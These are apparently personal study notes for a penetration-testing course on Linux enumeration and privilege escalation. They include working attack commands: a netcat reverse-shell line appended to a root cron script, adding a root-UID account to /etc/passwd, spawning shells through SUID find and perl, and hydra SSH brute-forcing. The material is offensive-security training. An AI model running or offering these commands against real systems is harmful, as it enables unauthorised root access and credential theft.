Enumerating Linux

most resources are represented in the filesystem

every file abids by user and group permissions:
read write and execute
r w x

each file has specific permissions for three categories:
owner, owner group, others

r allows read, w allows write(change content), x aloows running

for directory: r allows to see the list of files, w allows for create or delete files, execute allows crossing through directory to access content using cd

being about to cross through a directory without being able to read it gives the user permission to access known entries but only using exact names

ls -l <directory path>

for each group 3 different access permissions are displayed. First hyphen is file type so we can ignore

<file type><owner read><owner write><owner execute><group owner read><group owner wirte><group owner execute><other read><other write><other execute>

looks something like this:

-rw-r-----
owner has read and write but no exe, group owner only has read


Manual Enumeration

first thing when accessing target:
id user context

use
id
command

user has:
User Identifier UID 
and Group Identifier GID

to enumerate other users just read
cat /etc/passwd

see example:

joe:x:1000:1000:joe,,,:/home/joe:/bin/bash

Login Name is joe
Encrypted Password 'x' (x means hash is in /etc/shadow)
UID 1000 (root is 0, regular user start from 1000)
GID 1000
Comment "joe,,," description of user
Home Folder /home/joe
Login Shell /bin/bash (default interactive shell)

if Login Shell is /usr/sbin/nologin means login is blocked

hostname can infer perpose of machine
using:
hostname

Enterprise enforce naming convention, categorize by location, description, operating system and service level

the /etc/issue and /etc/os-release files contain information of os

/etc/os-release (this is a full command, use with cat)

uname -a also shows

to show system process:
ps aux

ps command for processes
ax to list all process with or without tty
u to list process in user-readable format

we can list the TCP/IP config of every network adapter with 
ifconfig
||
ip

ifconfig gives interface stat
ip a is more compact

we can display network routing table with
route
||
routel
based on distro and version

diplay active network connections with 
netstat
||
ss

both accept same argument

-a show all connection
-n no hostname resolution
-p process name listing

firewall rules

if network service is not remotely accessible because iptable, internal loopback interface can work

information about inbound and outbound port filtering can help with tunneling to pivot

we must have root to list firewall rules with 
iptables

iptables-persistent package on Debian Linux saves rules in
/etc/iptables by default
might have weak permissions

we can also search for files created by iptables-save, which is used to dump firewall config
this is used for iptable-restore as back up

we can seach the config directory /etc or grep the file system for iptables commands to locate file

scheduled tasks are commonly leveraged during privesc

linux based job scheduler is cron

tasks are listed under:
/etc/cron.*
where * represents the frequency of task

for example daily tasks are:
/etc/cron.daily

just list all of them:
ls -lah /etc/cron*

admin add own scheduled task in the 
/etc/crontab
file, check for insecure file permissions

to view current user scheduled jobs:
crontab -l

we can try to check with sudo

sudo crontab -l
shows root tasks

might need to manually seaarch for information of vulnerable installed application

show application installed by dpkg
dpkg -l

not realistic to poke around by hand:
use find

find / -writable -type d 2>/dev/null

using find we search  whote root (/) and use -writable to find only w, -type d to locate directory, filter error with 2>/dev/null (-SlientlyFail)

on most systems dirves are auto mount on boot
hence it's easy to forget about unmounted drives that has info

mount
lists all mounted file systems

cat /etc/fstab
filsts all drives that will be mounted at boot

lsblk
to list all available disks

lsmod
list of dirvers and kernel modules

/sbin/modinfo <driver name>
note that modinfo needs full path

aside from rwx there are setuid and setgid with s

if both rights are set uppercase or lowercase s will appear, this allows for current user to exe with owner or ownergroup permission

exe inherits the permission of the user, assume SUID is set, binary will run with permission of file owner

when user or sys cript launches SUID, it inherits the UID/GID of ini script: effective UID/GID

anny user that subvert a setuid root program to call a command of their choice can impersonate root

find / -perm -u=s -type f 2>/dev/null

to look for s with root EUID/EGID

say /bin/cp where SUID, we can copy and overwrite sensitive files such as /etc/passwd


Automated Enumeration

ini baseline:
unix-privesc-check

installed at:
/usr/bin/unix-privesc-check

./unix-privesc-check standard > output.txt
to run the tool as standard and shove into output.txt



Expkosed Confidential Information

Inspecting User Trails

user-specific configuration files and subdirectories within home directory, dot diles:
.script
.bashrc

sometime sys admin store credentials inside env variables as way to interact with custom scripts

env
to list environment variables

looking through 
cat .bashrc
to double check for variables that looks like passwords

we can escalate privilege right away by:
su - root
note that this will need password

crunch <min_word_num> <max_word_num> -t <hardcode>%%% > wordlist

crunch 6 6 -t Lab%%% > wordlist
gives minium word length of 6 max word length of 6, with a patter of
Lab num num num

we can then hydra it

hydra -l <username> -P <wordlist> <ip> -t <thread count> <type> -V

hydra -l eve -P wordlist 192.168.45.164 -t 4 ssh -V

we can verify if we're running as privileged user by:
sudo -l

sudo -i
gets us to root right away


Inspecting Service Footprints

daemons: services spawned at boot time to perform operations without user interaction

daemons like SSH, web server db

sys admin use custom daemon to exe ad-hoc tasks

on Linux we can list info about high privilege processes such as the ones under root

with the ps command which takes a single snapshot of the active processes

we'll need to loop it with watch

watch -n 1 "ps -aux | grep pass"
this loops ps -aux | grep pass every second

tcpdump 
std::packet capture, needs sudo, or just pivot to IT account

sudo tcpdump -i lo -A | grep "pass"
capture taffic IO loopback interface, dump content in ASCII via -A


Insecure File Permissions

Abusing Cron Jobs

need to locate exe file with write && runs at root level

cron time based job scheduler is a prime target

grep "CRON" /var/log/syslog
inspect cron log file

suppose we locate CRON by local user

we cat the file to see what's in it
we 
ls -lah <directory> 
to see the other permission if it's -eeeeeerw-, it means we have read write to the file

so:
cd .scripts (or the location of the script)

echo >> <scriptname>.sh to write to the script

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <my ip> <port> >/tmp/f" >> <scriptname>.sh

cat <scriptname>.sh


Abusing Password Authentication

unless AD or LDAP is used passwords for Linux are always in
/etc/shadow

password hashes with other account info are stored in the word-readable
/etc/passwd

if a password hash is present in secon colimn of /etc/passwd user record,it is considered valid for auth and takes precedence over respective entry in /etc/shadow

so if we can write into /etc/passwd we can set arbitrary password

we'll generate a password hash using openssl

openssl passwd lmao (this need to be ran on the target)

echo "root2:<Hash>:0:0:root:/root:/bin/bash" >> /etc/passwd

su root2 (this is to be done on the target as well)



Insecure Systemm Components

Abusing Setuid Binaries and Capabilities

when a user or a system script launches a process it inherits the UID/GID of the initiating script

user passwords are stored as hashes in /etc/shadow which is only writable by root uid=0

effective UID/GID represents the actual value being checked

passwd
changes password of the user

ps u -C passwd
lists all processes and filter for passwd

doing the ps u also shows Uid which let's us do this:

grep Uid /proc/<pid>/status

noramlly the UID should be all 1000

but since passwd needs root to write to etc/shadow it is:
1000 0 0 0

this is the case because passwd has a special flag of Set-User-ID
ls -lsa /usr/bin/passwd:
-rwsr-xr-x

SUID depicted by s, it can be configed using
chmod u+s <filename>
this sets the effective UID of the running process to the exe owner's uid

suppose find program is misconnfiged

find <file> -exec "/usr/bin/bash" -p\;
this exe bin bash after finding the file

Linux capabilities

extra attributes that can be applied to processes, binaries and services to assign specific privileges reserved for admin

manual enumeration of the vulnerability:

/usr/sbin/getcap -r / 2>/dev/null

-r for recusive search of / root
2>/dev/null is error handel

we should look for intresting flags like:
cap_setuid+ep
+ep means effective and permitted

we can check on GTFOBins website to check how the capability can  be misused

for perl:
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'


Abusing Sudo

config of sudo permissions can be applied in /etc/sudoers
sudo --list 
||
sudo -l
to list the allowed commands

if /etc/sudoers config is too permissive, user can abuse admin rights

check with GTFObins

if the GTFOBins fails check with: 
cat /var/log/syslog | grep <name>

audit daemon of AppArmor can block priv esc attempts from kernel

we can verify the status of AppArmor with root

aa-status



Exploiting Kernel Vulnerabilities

strong way to esc priv, but depends on kernel version, os flavor

first enum:
cat /etc/issue

uname -r

arch

use searchsploit
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"

if using gcc exploits:
kali comes with gcc
we can compile and run on target with

scp <name>.c <username>@<ip>:
this transfers
gcc <name>.c -o <name>
this compiles
file <name>
double check the arch
./<name>
run

linpeas.sh op, use it

pkexec means pwnkit if kernel 2018>